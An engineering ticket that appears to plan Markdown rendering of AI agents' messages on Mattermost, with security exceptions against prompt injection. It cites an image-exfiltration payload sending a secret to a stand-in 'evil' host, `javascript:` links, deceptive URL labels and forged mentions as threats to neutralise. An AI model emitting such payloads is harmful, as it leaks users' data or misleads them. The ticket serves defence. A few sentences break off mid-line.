# FIX-142: Agent messages render on chat platforms exactly as written — full Markdown, safe — **medium–large, phase 5**

## Goal
The owner (2026-11-14), with a screenshot of a Mattermost post from an agent: "messages get to
Mattermost with the formatting escaped, so they end up unformatted." The post shows `**Funny:**`,
`**Your meetings today:**` and a `` `insufficient_scope` `` code span as literal characters. Then: "make
sure markdown tables in chat (and external channels) render correctly. in fact, make sure all
standard+github markdown renders correctly. there have better be very serious security reasons to break
some formatting!"

Today every piece of agent text bound for a chat platform goes through `Content::untrusted`
(`crates/aurora-channels/src/content.rs`) → `aurora_core::sanitize::markdown_as_data`, which
backslash-escapes every Markdown-active character, so no formatting survives. Call sites:
- `services/aurora-api/src/domains/channels/mirror.rs` `post_answer` (turn answers mirrored to the
  thread) — the screenshot's path;
- `services/aurora-api/src/domains/channels/messaging.rs` `compose` and `bad_text` (`send_message`).

**Target: an agent's message shows on the platform as its Markdown means**: everything the platform
can render natively passes through **byte for byte**; what the platform cannot render is converted to
its nearest equivalent (never dropped, never left as raw syntax when an equivalent exists); the only
deliberate changes are D-227's security exceptions. Anything else is a bug.

## Rules (D-226, D-227)
### Security exceptions — the only places the core changes what the agent wrote (D-227)
Model text can be steered by prompt injection (an email, a web page, an issue the agent read).
1. **Images are never inline**: `![alt](url)` becomes a link `[🖼 alt (host)](url)` (empty alt → `image`; coordinator 2026-11-14, D-226(a) "with the host"; under rule 2). Reason:
   clients and image proxies fetch images with no click, so `![](https://evil/?d=<secret>)` leaks data
   the moment the post is shown.
2. **Link schemes**: only `http`, `https`, `mailto` stay links; any other scheme (`javascript:`,
   `data:`, relative, …) becomes the label as text. Reason: script execution / meaningless targets.
   A link whose **label itself looks like a URL or domain that differs from the destination's host**
   (`[https://cern.ch](https://evil.example)`) gets ` (→ evil.example)` after it. Reason: the one link
   form that lies about where it goes. Ordinary labels are untouched.
3. **Raw HTML outside GitHub's allowlist** (the list in `FIX-137.md` "What must render" item 3) is
   removed, keeping its text. Reason: XSS on any client that renders HTML. Allowlisted HTML stays in the
   neutral text; connectors convert it (below).
4. **Neutral tokens** (`<@user:…>`, `<#space:…>`, `<@here>`) typed in the text never form. Reason:
   forged mentions/broadcasts. Mentions themselves work (D-226(b)): `@username` passes through, a
   standalone `@here` (outside code, word boundary) becomes the core's `<@here>`; `@channel`/`@all` stay
   defused by the connector.
### Platform limitations — not exceptions, conversions (connector, D-227)
Each connector documents a conversion table in its spec (`20 §Rendering` for Mattermost). Mattermost,
to verify against the Mattermost docs and the dev server's version, and record in `20`:

| Construct | Mattermost | Conversion if not native |
|---|---|---|
| Headings, emphasis, strong, strikethrough, inline code, block quotes, rules, nested/ordered lists, hard breaks, autolinks, emoji shortcodes | native (verify each) | — |
| Tables (alignment, inline formatting in cells) | native | a table longer than one post is split by rows, **header row repeated** in each post |
| Fenced code with language | native, highlighted | — |
| Task lists | verify | `☐` / `☑` list items |
| Footnotes | not native | `[1]` at the reference, a "Notes" list at the end of the message |

| Math `$$…$$`, ```` ```math ```` | ```` ```latex ```` blocks render when the server enables LaTeX | ```` ```latex ```` block (renders when enabled, readable code otherwise); inline `$…$` left as is (renders with inline LaTeX enabled) |

## Plan
### 0. Spec (Opus, first)
D-226 and D-227 are decided (`docs/90-decisions.md`). Write them into: `13 §4.3` (neutral content is
CommonMark + GFM + github.com additions + allowlisted HTML; agent message bodies keep it, with D-227's

`13 §4.x` connector duty (pass native constructs through unchanged, convert the rest per a documented

`20 §Rendering` (the table above, as verified), SEC-18 in `17`, `docs/tests/security-coverage.md`.

### 1. Core sanitizer (`crates/aurora-core/src/sanitize.rs`)
`pub fn markdown_safe(s: &str, max: usize) -> String` — **minimal edits, not re-emission**:
- `block` first (controls/bidi stripped, clamp) as `markdown_as_data` does;
- parse with `pulldown-cmark` 0.13 (workspace dependency; add to `aurora-core`) using the **offset
  iterator**, with tables, strikethrough, task lists, footnotes, math and GFM options on;
- copy the source through unchanged and rewrite **only** the byte ranges of D-227's exceptions (images,
  bad-scheme links, deceptive URL labels, disallowed HTML, typed neutral tokens); replacement text is
  escaped for its context;
- **verify by re-parsing** the result: no image, no non-allowed scheme, no disallowed HTML, no neutral
  token except the core's `<@here>`. If verification fails for a block (a pathological input), that
  block alone falls back to `markdown_as_data` and a counter/trace records it;
- idempotent: `markdown_safe(markdown_safe(x)) == markdown_safe(x)`.

### 2. Content constructor (`crates/aurora-channels/src/content.rs`)
`Content::agent_markdown(raw)` = `markdown_safe` + the `@here` → `<@here>` step; doc comment: an agent's
own message body only. Update the module comment ("CommonMark subset" → the D-227 format; `with_here`
is no longer the only source of `<@here>`). `untrusted` and `platform` unchanged.

### 3. Call sites (`services/aurora-api/src/domains/channels/`)
- `mirror.rs` `post_answer`: `agent_markdown`; a **Markdown-aware chunker**: split only between
  top-level blocks; a fenced block longer than a chunk is closed at the cut and reopened (same info
  string); a table longer than a chunk is split by rows with the header and delimiter rows repeated;
  a list is split between items. Update the `CHUNK_MAX` comment; keep checking the **converted** chunk
  against `message_max_chars` (the connector's conversions can grow text: give the chunker a margin
  or let the connector report the converted length — say which).
- `messaging.rs` `compose` and `bad_text`: `agent_markdown` for the body; the "via" line stays
  `Content::platform` + `sanitize::label`. A held `send_message` carrying `@here` adds "Notifies
  everyone online in the channel (@here)" to its approval summary (labels only, never the text).
- List in the commit every other place an agent's message body reaches a platform; card text, labels and
  approval summaries stay `untrusted`.

### 4. Mattermost connector (`connectors/mattermost/src/render.rs`)
Implement the conversion table (a small pulldown-cmark pass with offsets, same minimal-edit style:
native constructs untouched). `defuse` must keep working inside formatted text and never alter code
spans or fenced blocks. Link-preview item.

### 5. Fake connector
`connectors/fake` renders neutral text verbatim; conformance gains a scenario that a formatted agent
answer reaches the platform with every native construct unchanged.

## Acceptance criteria
- [ ] **Fidelity corpus**: every CommonMark 0.31 and GFM spec example, plus a github.com-additions set
      (footnotes, alerts, math, Mermaid, allowlisted HTML), through `markdown_safe`: the pulldown-cmark
      HTML of the output equals that of the input, **except** examples that hit a D-227 exception,
      listed by number with the exception that applies. A new difference fails the test.
- [ ] Exceptions table-driven: image → link; `javascript:`/`data:`/relative in inline, reference,
      autolink and raw `<a>` forms → text; URL-looking label to another host → `(→ host)`, ordinary

      inert; `@here`/`@Here` → `<@here>`; `@here` in code, `foo@here.org`, `@hereby` unchanged;
      `@channel`/`@all`/`@alex` unchanged by the core.
- [ ] Property tests: no image and no non-allowed scheme after re-parse; no neutral token except the
      core's `<@here>`; controls/bidi stripped; idempotent; no panic on any input.
- [ ] Chunker: long fence, long table (header repeated, each chunk a valid table), long list; no chunk
      over the platform limit after conversion.

      rendered `<@here>` → live `@here`; literal `@channel`/`@all`/`@here` defused.
